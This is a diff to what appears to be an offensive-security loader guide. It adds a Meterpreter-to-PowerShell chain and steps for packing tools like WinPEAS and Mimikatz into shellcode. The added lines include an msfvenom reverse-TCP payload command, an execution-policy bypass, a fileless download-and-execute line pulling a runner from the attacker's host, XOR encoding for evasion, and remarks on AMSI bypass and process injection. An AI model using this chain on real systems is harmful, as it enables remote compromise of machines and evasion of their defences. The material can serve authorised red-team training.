@@ -9,6 +9,7 @@
 | Constraints | Recommended Loader | Section |
 |-------------|-------------------|---------|
 | No restrictions | `shellcode-runners/simple-runner.cs` | XOR, runs in own process |
+| No compilation available, have PS | `shellcode-runners/ps1-runner.ps1` | Pure PS, no .exe needed |
 | Want to blend into existing process | `process-injection/basic-injection.cs` | XOR, injects into explorer/spoolsv |
 | Want process to appear as svchost | `process-hollowing/hollow.cs` | XOR, hollows svchost.exe |
 | AppLocker blocking .exe | `shellcode-runners/clrunner.cs` | AES, via InstallUtil |
@@ -19,6 +20,7 @@
 | Already have webshell | `webshells/ASPX_Inject64.aspx` | AES, injects from web |
 | Linux target | `linux/simpleLoader.c` | XOR, C loader |
 | DLL side-loading | `dll-runners/DLL_Runner.cs` | XOR |
+| Running an arbitrary binary (WinPEAS, Mimikatz, etc.) | Donut → any loader above | See `binary-packing.md` |
 
 ---
 
@@ -115,6 +117,54 @@ csc.exe /unsafe /platform:x64 /r:System.Management.Automation.dll /out:psbypass.
 :: As DLL
 csc.exe /unsafe /platform:x64 /target:library /out:runner.dll DLL_Runner.cs
 ```
+
+---
+
+## Meterpreter → PS1 Chain (`shellcode-runners/ps1-runner.ps1`)
+
+**No compilation needed.** Msfvenom outputs PowerShell-native shellcode format. The PS1 runner
+calls WinAPI via reflection — no `Add-Type`, no temp files.
+
+```bash
+# 1. Generate shellcode in PS format
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f powershell
+# Output: [Byte[]] $buf = 0xfc,0x48,...
+
+# 2. Paste $buf into ps1-runner.ps1 (replace the placeholder line)
+
+# 3. Deliver — choose one:
+```
+```powershell
+# Run from file
+powershell -ExecutionPolicy Bypass -File .\ps1-runner.ps1
+
+# Fully fileless from Kali (serve with python3 -m http.server 80)
+IEX (New-Object Net.WebClient).DownloadString('http://<KALI>/ps1-runner.ps1')
+```
+
+**Comparison to .exe and .dll paths:**
+
+| Format | Chain | Requires |
+|--------|-------|---------|
+| `.exe` | shellcode → C# loader → compile → execute | Visual Studio (Windows dev box) |
+| `.dll` | shellcode → DLL_Runner.cs → compile → DLL_Loader.ps1 loads it | Visual Studio + PS on victim |
+| `.ps1` | shellcode → ps1-runner.ps1 → deliver | Only PS on victim |
+
+---
+
+## Packing Arbitrary Binaries (WinPEAS, Mimikatz, etc.)
+
+See **`binary-packing.md`** for the full workflow.
+
+Short version:
+```bash
+# Any .exe → shellcode → encode → paste into loader above
+go-donut --in WinPEASany.exe --out winpeas.bin
+python3 04-encoders/xor/xor_encoder.py winpeas.bin 0xfa --format csharp
+# Paste into basic-injection.cs → compile → run
+```
+
+For .NET tools, Invoke-SharpLoader (`reflective/`) is easier (captures output, auto-bypasses AMSI).
 
 ---
 
